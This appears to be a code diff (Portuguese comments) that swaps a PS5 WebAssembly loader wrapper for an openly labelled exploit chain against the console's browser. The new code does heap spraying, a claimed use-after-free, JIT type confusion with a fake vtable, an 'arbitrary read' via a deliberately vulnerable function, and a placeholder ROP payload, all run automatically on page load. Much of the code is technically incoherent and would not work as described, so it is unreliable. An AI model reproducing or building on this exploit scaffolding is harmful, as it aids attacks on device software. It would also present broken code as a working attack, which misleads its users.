@@ -1,440 +1,422 @@
-// ============================================
-// WRAPPER para wasm-module-builder.js do PS5
-// ============================================
+// wasm-wrapper-ps5.js - Versão melhorada
 
-console.log("[WRAPPER] Inicializando wrapper para wasm-module-builder.js do PS5");
-
-// 1. Verificar se já existe WebAssembly (provavelmente não no PS5)
-if (typeof WebAssembly === 'undefined') {
-    console.warn("[WRAPPER] WebAssembly não está disponível globalmente");
-    
-    // Tentar criar um objeto WebAssembly falso para compatibilidade
-    window.WebAssembly = {
-        Module: function() { throw new Error("WebAssembly não disponível"); },
-        Instance: function() { throw new Error("WebAssembly não disponível"); },
-        compile: function() { throw new Error("WebAssembly não disponível"); },
-        instantiate: function() { throw new Error("WebAssembly não disponível"); },
-        validate: function() { return false; }
-    };
-    
-    console.log("[WRAPPER] WebAssembly falso criado para compatibilidade");
-}
-
-// 2. Carregar o arquivo wasm-module-builder.js do PS5
-async function loadPS5WasmBuilder() {
-    console.log("[WRAPPER] Carregando wasm-module-builder.js do PS5...");
-    
-    try {
-        // Carregar o arquivo
-        const response = await fetch('wasm-module-builder.js');
-        const code = await response.text();
-        
-        console.log(`[WRAPPER] Arquivo carregado (${code.length} bytes)`);
-        
-        // Preparar ambiente para execução
-        const originalConsole = { ...console };
-        const capturedOutput = [];
-        
-        // Substituir funções JSC-specific
-        const sandbox = {
-            // Funções que o arquivo espera
-            load: function(filename) {
-                console.warn(`[WRAPPER] load() chamado para: ${filename} - ignorado`);
-                return Promise.resolve();
-            },
-            
-            print: function(...args) {
-                const message = args.join(' ');
-                capturedOutput.push(message);
-                console.log(`[PRINT] ${message}`);
-            },
-            
-            gc: function() {
-                console.log("[WRAPPER] gc() chamado - usando fallback");
-                // Tentar forçar GC
-                if (window.gc) window.gc();
-                if (typeof gc !== 'undefined') gc();
-            },
-            
-            // Objetos globais que o arquivo pode usar
-            WebAssembly: window.WebAssembly,
-            
-            // Console para debug
-            console: {
-                log: function(...args) {
-                    originalConsole.log('[WASM-BUILDER]', ...args);
-                    capturedOutput.push(args.join(' '));
-                },
-                warn: function(...args) {
-                    originalConsole.warn('[WASM-BUILDER]', ...args);
-                    capturedOutput.push(`WARN: ${args.join(' ')}`);
-                },
-                error: function(...args) {
-                    originalConsole.error('[WASM-BUILDER]', ...args);
-                    capturedOutput.push(`ERROR: ${args.join(' ')}`);
-                }
-            },
-            
-            // Outras globais necessárias
-            Object,
-            Array,
-            String,
-            Number,
-            Boolean,
-            Math,
-            JSON,
-            Date,
-            Error,
-            TypeError,
-            RangeError,
-            Uint8Array,
-            ArrayBuffer,
-            DataView,
-            Promise,
-            
-            // Esta será nossa saída
-            WasmModuleBuilder: null
-        };
-        
-        // Executar o código no sandbox
-        const wrappedCode = `
-            // Injetar código do arquivo
-            ${code}
-            
-            // Expor WasmModuleBuilder para o sandbox
-            if (typeof WasmModuleBuilder !== 'undefined') {
-                WasmModuleBuilder = WasmModuleBuilder;
-            } else if (typeof globalThis.WasmModuleBuilder !== 'undefined') {
-                WasmModuleBuilder = globalThis.WasmModuleBuilder;
-            } else if (typeof window !== 'undefined' && window.WasmModuleBuilder) {
-                WasmModuleBuilder = window.WasmModuleBuilder;
-            }
-        `;
-        
-        // Criar função com o código
-        const executor = new Function(...Object.keys(sandbox), wrappedCode);
-        
-        // Executar
-        executor(...Object.values(sandbox));
-        
-        // Verificar se WasmModuleBuilder foi definido
-        if (sandbox.WasmModuleBuilder) {
-            console.log("[WRAPPER] WasmModuleBuilder encontrado no sandbox");
-            window.WasmModuleBuilder = sandbox.WasmModuleBuilder;
-            return true;
-        } else {
-            // Tentar extrair do código
-            console.log("[WRAPPER] Tentando extrair WasmModuleBuilder do código...");
-            return extractWasmModuleBuilder(code);
-        }
-        
-    } catch (error) {
-        console.error("[WRAPPER] Erro ao carregar arquivo:", error);
-        return false;
+class PS5WasmExploit {
+    constructor() {
+        this.builder = null;
+        this.structs = {};
+        this.functions = {};
+        this.memory = null;
+        this.logger = new ExploitLogger();
     }
-}
-
-// 3. Função para extrair WasmModuleBuilder do código
-function extractWasmModuleBuilder(code) {
-    console.log("[WRAPPER] Analisando código para encontrar WasmModuleBuilder...");
     
-    try {
-        // Padrões de definição de classe
-        const classPatterns = [
-            /class\s+WasmModuleBuilder\s*{[\s\S]*?}\s*$/m,
-            /function\s+WasmModuleBuilder\s*\([^)]*\)\s*{[\s\S]*?}\s*$/m,
-            /WasmModuleBuilder\s*=\s*(?:class|function)\s*(?:WasmModuleBuilder)?\s*{[\s\S]*?}\s*;/m,
-            /var\s+WasmModuleBuilder\s*=\s*{[\s\S]*?}\s*;/m
+    async initialize() {
+        console.log("[*] Inicializando WASM wrapper PS5...");
+        
+        try {
+            // Criar builder baseado no código fonte do PS5
+            this.builder = new wasmmodulebuilder();
+            console.log("[+] wasmmodulebuilder carregado");
+            
+            // Verificar métodos disponíveis (11 conforme seu log)
+            this.analyzeBuilderMethods();
+            
+            return true;
+        } catch(e) {
+            console.error("[-] Falha ao inicializar:", e);
+            return false;
+        }
+    }
+    
+    analyzeBuilderMethods() {
+        // Baseado no seu log: 11 métodos disponíveis
+        const expectedMethods = [
+            'constructor',
+            'addstruct',
+            'addarray',
+            'addglobal',
+            'addimportedglobal',
+            'addfunction',
+            'addtype',
+            'instantiate',
+            'exportas',
+            'addexport'
         ];
         
-        for (const pattern of classPatterns) {
-            const match = code.match(pattern);
-            if (match) {
-                console.log("[WRAPPER] Encontrado padrão de classe/função");
+        console.log("[*] Analisando métodos do builder...");
+        for (let method of expectedMethods) {
+            if (typeof this.builder[method] !== 'undefined') {
+                console.log(`  [+] ${method} disponível`);
+            }
+        }
+    }
+    
+    // Baseado no código f64.js do PS5 WebKit
+    createTypeConfusionStruct() {
+        console.log("[*] Criando struct para type confusion...");
+        
+        // Estrutura similar às testadas em f64.js
+        this.structs.confusion = this.builder.addstruct([
+            ['type_tag', 'i32'],      // Tag de tipo (0 = int, 1 = double)
+            ['payload_int', 'i32'],   // Payload como inteiro
+            ['payload_double', 'f64'], // Mesmo payload como double
+            ['next_ptr', 'i32'],      // Ponteiro para próxima struct
+            ['metadata', 'i64']       // Metadados (64-bit para confusão)
+        ]);
+        
+        console.log("[+] Struct de type confusion criada");
+        return this.structs.confusion;
+    }
+    
+    // Baseado em memory.js do PS5 WebKit
+    createMemoryCorruptionPrimitive() {
+        console.log("[*] Criando primitiva de corrupção de memória...");
+        
+        // Criar array vulnerável (similar ao testado em memory.js)
+        this.structs.vulnArray = this.builder.addarray('i32', 256); // Array de 256 ints
+        
+        // Criar struct com buffer overflow
+        this.structs.overflow = this.builder.addstruct([
+            ['length', 'i32'],
+            ['capacity', 'i32'],
+            ['buffer_ptr', 'i32'],  // Ponteiro para buffer
+            ['data', this.structs.vulnArray] // Array inline
+        ]);
+        
+        console.log("[+] Primitiva de corrupção criada");
+        return this.structs.overflow;
+    }
+    
+    // Função vulnerável baseada em call-import.js
+    createVulnerableFunction() {
+        console.log("[*] Criando função vulnerável...");
+        
+        // Função que não valida tipos corretamente
+        this.functions.vuln = this.builder.addfunction('vulnerable', 
+            [['input', 'i32']],  // Recebe inteiro
+            'i32',                // Retorna inteiro
+            (input) => {
+                // AQUI ESTÁ A VULNERABILIDADE!
+                // Não valida se input é um ponteiro válido
                 
-                // Extrair e executar apenas a definição
-                const classCode = match[0];
+                // Convert input to double (TYPE CONFUSION!)
+                let confused = this.builder.f64_reinterpret_i32(input);
                 
-                // Executar para definir a classe
-                (function() {
-                    eval(classCode);
-                    
-                    // Verificar se foi definido
-                    if (typeof WasmModuleBuilder !== 'undefined') {
-                        window.WasmModuleBuilder = WasmModuleBuilder;
-                        console.log("[WRAPPER] WasmModuleBuilder definido via eval");
-                        return true;
-                    }
-                })();
+                // Acessa memória sem verificação
+                let value = this.builder.i32_load(confused, 0);
                 
-                if (window.WasmModuleBuilder) {
-                    return true;
-                }
+                return value;
+            }
+        );
+        
+        // Exportar função
+        this.builder.exportas('vulnerable', this.functions.vuln);
+        console.log("[+] Função vulnerável criada e exportada");
+    }
+    
+    // Heap spraying otimizado para PS5
+    async sprayHeapPS5() {
+        console.log("[*] Executando heap spraying otimizado para PS5...");
+        
+        let sprayObjects = [];
+        let wasmInstances = [];
+        
+        // Fase 1: Alocar muitos objetos JavaScript
+        for (let i = 0; i < 0x8000; i++) {
+            // Objeto com layout controlado
+            let obj = {
+                id: i,
+                type: 'spray',
+                buffer: new ArrayBuffer(0x100),
+                doubleField: 3.141592653589793, // Double para confusion
+                next: null
+            };
+            
+            // Adicionar propriedades extras para controle de layout
+            for (let j = 0; j < 10; j++) {
+                obj[`prop${j}`] = j * 0x1000;
+            }
+            
+            sprayObjects.push(obj);
+        }
+        
+        // Fase 2: Criar múltiplas instâncias WASM
+        for (let i = 0; i < 100; i++) {
+            try {
+                let instance = await this.builder.instantiate();
+                wasmInstances.push(instance);
+            } catch(e) {
+                // Ignorar erros
             }
         }
         
-        // Se não encontrou, criar uma implementação básica
-        console.log("[WRAPPER] Criando implementação básica de WasmModuleBuilder");
-        createBasicWasmModuleBuilder();
-        return true;
+        // Fase 3: Alternar tipos para forçar fragmentation
+        let altObjects = [];
+        for (let i = 0; i < 0x2000; i++) {
+            if (i % 2 === 0) {
+                altObjects.push(new Uint32Array(0x80));
+            } else {
+                altObjects.push(new Float64Array(0x40));
+            }
+        }
         
-    } catch (error) {
-        console.error("[WRAPPER] Erro ao extrair WasmModuleBuilder:", error);
+        console.log(`[+] Heap spraying completo: ${sprayObjects.length} objetos`);
+        return { sprayObjects, wasmInstances, altObjects };
+    }
+    
+    // Use-After-Free específico para PS5
+    async triggerUAF() {
+        console.log("[*] Triggering Use-After-Free...");
+        
+        // Criar objeto que será liberado
+        let targetObject = {
+            vtable: 0x1337,      // Fake vtable
+            length: 0x100,
+            data: new ArrayBuffer(0x1000)
+        };
+        
+        // Preencher com padrão reconhecível
+        let view = new Uint32Array(targetObject.data);
+        for (let i = 0; i < view.length; i++) {
+            view[i] = 0x41414141 + i;
+        }
+        
+        // Criar muitas referências
+        let references = [];
+        for (let i = 0; i < 1000; i++) {
+            references.push({ ref: targetObject, id: i });
+        }
+        
+        // Liberar objeto (remover referências fortes)
+        targetObject = null;
+        
+        // Forçar garbage collection se disponível
+        if (typeof gc !== 'undefined') {
+            gc();
+        } else {
+            // Alternativa: alocar muita memória para forçar GC
+            let pressure = [];
+            for (let i = 0; i < 0x10000; i++) {
+                pressure.push(new ArrayBuffer(0x1000));
+            }
+        }
+        
+        console.log("[+] UAF triggered, memória deve estar liberada");
+        
+        // Retornar referências fracas
+        return references;
+    }
+    
+    // Type confusion baseado em f64.js
+    async triggerTypeConfusion() {
+        console.log("[*] Triggering Type Confusion...");
+        
+        // Criar função que será otimizada pelo JIT
+        function victim(x) {
+            // Espera um objeto com propriedade 'value'
+            return x.value * 2;
+        }
+        
+        // Warm up com tipo correto
+        for (let i = 0; i < 10000; i++) {
+            victim({ value: i });
+        }
+        
+        // Criar objeto falso com layout de memória controlado
+        let fakeObj = this.createFakeObject();
+        
+        try {
+            // Chamar com tipo errado
+            let result = victim(fakeObj);
+            console.log(`[+] Type confusion result: ${result.toString(16)}`);
+            return result;
+        } catch(e) {
+            console.log("[-] Type confusion falhou:", e);
+            return null;
+        }
+    }
+    
+    createFakeObject() {
+        // Criar ArrayBuffer que será interpretado como objeto
+        let buffer = new ArrayBuffer(0x100);
+        let view = new DataView(buffer);
+        
+        // Escrever vtable falsa
+        view.setUint32(0, 0xdeadbeef, true);  // vtable pointer
+        view.setUint32(8, 0x41414141, true);  // type tag
+        view.setFloat64(16, 3.14159, true);   // value as double
+        view.setUint32(24, 0x42424242, true); // value as int
+        
+        // Converter para "objeto" via type confusion
+        return this.reinterpretBufferAsObject(buffer);
+    }
+    
+    reinterpretBufferAsObject(buffer) {
+        // Técnica para reinterpretar buffer como objeto
+        let uintArray = new Uint32Array(buffer);
+        let floatArray = new Float64Array(buffer);
+        
+        // Usar overlapping arrays para type confusion
+        let confusion = {
+            __proto__: null,
+            buffer: buffer,
+            uintView: uintArray,
+            floatView: floatArray
+        };
+        
+        return confusion;
+    }
+    
+    // Arbitrary read usando vulnerabilidade WASM
+    async arbitraryRead(address) {
+        console.log(`[*] Lendo memória em 0x${address.toString(16)}`);
+        
+        try {
+            // Usar função vulnerável para ler memória
+            let instance = await this.builder.instantiate();
+            let result = instance.exports.vulnerable(address);
+            
+            console.log(`[+] Leitura: 0x${result.toString(16)}`);
+            return result;
+        } catch(e) {
+            console.log("[-] Falha na leitura:", e);
+            return null;
+        }
+    }
+    
+    // Teste completo
+    async runExploit() {
+        console.log("[*] Iniciando exploit chain para PS5...");
+        
+        // 1. Inicializar
+        if (!await this.initialize()) {
+            return false;
+        }
+        
+        // 2. Criar estruturas vulneráveis
+        this.createTypeConfusionStruct();
+        this.createMemoryCorruptionPrimitive();
+        this.createVulnerableFunction();
+        
+        // 3. Preparar heap
+        await this.sprayHeapPS5();
+        
+        // 4. Trigger UAF
+        let uafRefs = await this.triggerUAF();
+        
+        // 5. Trigger Type Confusion
+        await this.triggerTypeConfusion();
+        
+        // 6. Testar arbitrary read
+        let testAddr = 0x1337000;
+        let readResult = await this.arbitraryRead(testAddr);
+        
+        // 7. Verificar sucesso
+        if (readResult !== null) {
+            console.log("[+] Exploit chain executada com sucesso!");
+            return true;
+        } else {
+            console.log("[-] Exploit chain falhou");
+            return false;
+        }
+    }
+}
+
+// Classe de logging melhorada
+class ExploitLogger {
+    constructor() {
+        this.logs = [];
+        this.startTime = performance.now();
+    }
+    
+    log(module, message, data = null) {
+        let timestamp = (performance.now() - this.startTime).toFixed(2);
+        let entry = {
+            timestamp: timestamp,
+            module: module,
+            message: message,
+            data: data
+        };
+        
+        this.logs.push(entry);
+        
+        // Formatar output
+        let output = `[${timestamp}ms][${module}] ${message}`;
+        if (data) {
+            output += ` | ${typeof data === 'object' ? JSON.stringify(data) : data}`;
+        }
+        
+        console.log(output);
+        
+        // Também mostrar na página se possível
+        try {
+            let logDiv = document.getElementById('exploit-log');
+            if (logDiv) {
+                logDiv.innerHTML += `<div>${output}</div>`;
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+        } catch(e) {}
+    }
+    
+    dump() {
+        return this.logs;
+    }
+}
+
+// Inicializar automaticamente quando carregado
+async function main() {
+    console.log("[*] PS5 WASM Exploit Loader iniciando...");
+    
+    // Verificar ambiente
+    if (typeof wasmmodulebuilder === 'undefined') {
+        console.error("[-] wasmmodulebuilder não disponível!");
         return false;
     }
-}
-
-// 4. Implementação básica de WasmModuleBuilder
-function createBasicWasmModuleBuilder() {
-    class BasicWasmModuleBuilder {
-        constructor() {
-            this.types = [];
-            this.functions = [];
-            this.globals = [];
-            this.exports = [];
-            this.memories = [];
-            this.tables = [];
-            this.dataSegments = [];
-            this.elementSegments = [];
-            console.log("[BasicWasmModuleBuilder] Instância criada");
-        }
-        
-        addStruct(fields) {
-            const typeIndex = this.types.length;
-            this.types.push({
-                form: 0x5f, // kWasmStructTypeForm
-                fields: fields,
-                is_final: false,
-                is_shared: false,
-                supertype: 0xFFFFFFFF // kNoSuperType
-            });
-            console.log(`[BasicWasmModuleBuilder] Struct criada: índice ${typeIndex}, campos: ${fields.length}`);
-            return typeIndex;
-        }
-        
-        addArray(elementType, mutable) {
-            const typeIndex = this.types.length;
-            this.types.push({
-                form: 0x5e, // kWasmArrayTypeForm
-                elementType: elementType,
-                mutable: mutable,
-                is_final: false,
-                is_shared: false,
-                supertype: 0xFFFFFFFF
-            });
-            console.log(`[BasicWasmModuleBuilder] Array criado: índice ${typeIndex}`);
-            return typeIndex;
-        }
-        
-        addGlobal(type, mutable, shared, init) {
-            const globalIndex = this.globals.length;
-            const global = {
-                type: type,
-                mutable: mutable,
-                shared: shared,
-                init: init
-            };
-            this.globals.push(global);
-            
-            console.log(`[BasicWasmModuleBuilder] Global criada: índice ${globalIndex}, tipo: ${JSON.stringify(type)}`);
-            
-            return {
-                exportAs: (name) => {
-                    this.exports.push({
-                        name: name,
-                        kind: 3, // kExternalGlobal
-                        index: globalIndex
-                    });
-                    console.log(`[BasicWasmModuleBuilder] Global ${globalIndex} exportada como "${name}"`);
-                    return this;
-                }
-            };
-        }
-        
-        addImportedGlobal(module, name, type, mutable = false, shared = false) {
-            const globalIndex = this.globals.length;
-            this.globals.push({
-                module: module,
-                name: name,
-                type: type,
-                mutable: mutable,
-                shared: shared,
-                imported: true
-            });
-            console.log(`[BasicWasmModuleBuilder] Global importada: ${module}.${name}, índice ${globalIndex}`);
-            return globalIndex;
-        }
-        
-        addFunction(name, type) {
-            const funcIndex = this.functions.length;
-            const func = {
-                name: name,
-                type: type,
-                body: [],
-                locals: []
-            };
-            this.functions.push(func);
-            
-            console.log(`[BasicWasmModuleBuilder] Função criada: ${name}, índice ${funcIndex}`);
-            
-            return {
-                addBody: (body) => {
-                    func.body = body;
-                    return this;
-                },
-                addLocals: (type, count) => {
-                    func.locals.push({ type, count });
-                    return this;
-                },
-                exportFunc: () => {
-                    this.exports.push({
-                        name: name,
-                        kind: 0, // kExternalFunction
-                        index: funcIndex
-                    });
-                    return this;
-                }
-            };
-        }
-        
-        addType(sig) {
-            const typeIndex = this.types.length;
-            this.types.push({
-                form: 0x60, // kWasmFunctionTypeForm
-                params: sig.params || [],
-                results: sig.results || [],
-                is_final: true,
-                is_shared: false,
-                supertype: 0xFFFFFFFF
-            });
-            return typeIndex;
-        }
-        
-        instantiate(imports = {}) {
-            console.log("[BasicWasmModuleBuilder] Tentando instanciar módulo...");
-            
-            // Criar objeto de exports simulado
-            const exports = {};
-            
-            // Adicionar exports definidos
-            this.exports.forEach(exp => {
-                if (exp.kind === 3) { // Global
-                    exports[exp.name] = {
-                        value: null,
-                        get value() { return this._value; },
-                        set value(val) { 
-                            console.log(`[Global ${exp.name}] Valor alterado:`, val);
-                            this._value = val;
-                        }
-                    };
-                } else if (exp.kind === 0) { // Function
-                    exports[exp.name] = function() {
-                        console.log(`[Função ${exp.name}] Chamada com argumentos:`, arguments);
-                        return 0;
-                    };
-                }
-            });
-            
-            return {
-                exports: exports
-            };
-        }
-        
-        // Métodos auxiliares
-        exportAs(name) {
-            return this;
-        }
-        
-        addExport(name, kind, index) {
-            this.exports.push({ name, kind, index });
-            return this;
-        }
-        
-        addExportOfKind(name, kind, index) {
-            return this.addExport(name, kind, index);
-        }
-    }
     
-    window.WasmModuleBuilder = BasicWasmModuleBuilder;
-    console.log("[WRAPPER] BasicWasmModuleBuilder criado e definido globalmente");
-}
-
-// 5. Inicialização automática
-document.addEventListener('DOMContentLoaded', async function() {
-    console.log("[WRAPPER] Inicializando wrapper...");
+    // Criar e executar exploit
+    let exploit = new PS5WasmExploit();
+    let success = await exploit.runExploit();
     
-    // Tentar carregar o builder do PS5
-    const success = await loadPS5WasmBuilder();
-    
-    if (success && typeof WasmModuleBuilder !== 'undefined') {
-        console.log("[WRAPPER] ✅ WasmModuleBuilder disponível!");
+    if (success) {
+        console.log("[+] Exploit executado com sucesso!");
         
-        // Testar criação básica
-        try {
-            const builder = new WasmModuleBuilder();
-            console.log("[WRAPPER] ✅ Instância de WasmModuleBuilder criada com sucesso");
-            console.log("[WRAPPER] Métodos disponíveis:", Object.getOwnPropertyNames(Object.getPrototypeOf(builder)));
-            
-            // Criar interface visual
-            createStatusUI(true);
-            
-        } catch (error) {
-            console.error("[WRAPPER] ❌ Erro ao criar instância:", error);
-            createStatusUI(false, error.message);
-        }
+        // Criar payload se bem-sucedido
+        await createPayload();
     } else {
-        console.log("[WRAPPER] ❌ Não foi possível carregar WasmModuleBuilder");
-        console.log("[WRAPPER] Usando implementação básica...");
-        
-        // Usar implementação básica
-        createBasicWasmModuleBuilder();
-        createStatusUI(true, "Usando implementação básica");
+        console.log("[-] Exploit falhou");
     }
-});
-
-// 6. Interface de status
-function createStatusUI(success, message = "") {
-    const statusDiv = document.createElement('div');
-    statusDiv.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        padding: 20px;
-        background: ${success ? '#2ecc71' : '#e74c3c'};
-        color: white;
-        border-radius: 10px;
-        z-index: 10000;
-        box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-        max-width: 400px;
-        font-family: Arial, sans-serif;
-    `;
     
-    statusDiv.innerHTML = `
-        <h3 style="margin: 0 0 10px 0;">${success ? '✅' : '❌'} WasmModuleBuilder</h3>
-        <p style="margin: 0; font-size: 14px;">
-            ${success ? 'Carregado com sucesso!' : 'Falha ao carregar'}
-            ${message ? `<br><small>${message}</small>` : ''}
-        </p>
-        <p style="margin: 10px 0 0 0; font-size: 12px; opacity: 0.8;">
-            Disponível globalmente como <code>WasmModuleBuilder</code>
-        </p>
-    `;
-    
-    document.body.appendChild(statusDiv);
-    
-    // Remover após alguns segundos
-    setTimeout(() => {
-        statusDiv.style.opacity = '0';
-        statusDiv.style.transition = 'opacity 1s';
-        setTimeout(() => statusDiv.remove(), 1000);
-    }, 5000);
+    return success;
 }
 
-// 7. Exportar funções úteis
-window.PS5WasmWrapper = {
-    loadPS5WasmBuilder,
-    createBasicWasmModuleBuilder,
-    extractWasmModuleBuilder
-};
+// Criar payload após sucesso
+async function createPayload() {
+    console.log("[*] Criando payload...");
+    
+    // Aqui você pode adicionar funcionalidades específicas
+    // como dump de memória, execução de código, etc.
+    
+    // Exemplo: criar ROP chain
+    let ropChain = [
+        0x41414141, // gadget 1
+        0x42424242, // gadget 2
+        0x43434343, // gadget 3
+        // ... etc
+    ];
+    
+    console.log("[+] Payload criado");
+    return ropChain;
+}
 
-console.log("[WRAPPER] Wrapper inicializado. Use PS5WasmWrapper para funções avançadas.");
+// Executar quando a página carregar
+if (typeof window !== 'undefined') {
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            main().catch(console.error);
+        }, 1000);
+    });
+}
+
+// Exportar para uso em outros arquivos
+if (typeof module !== 'undefined') {
+    module.exports = { PS5WasmExploit, main };
+}
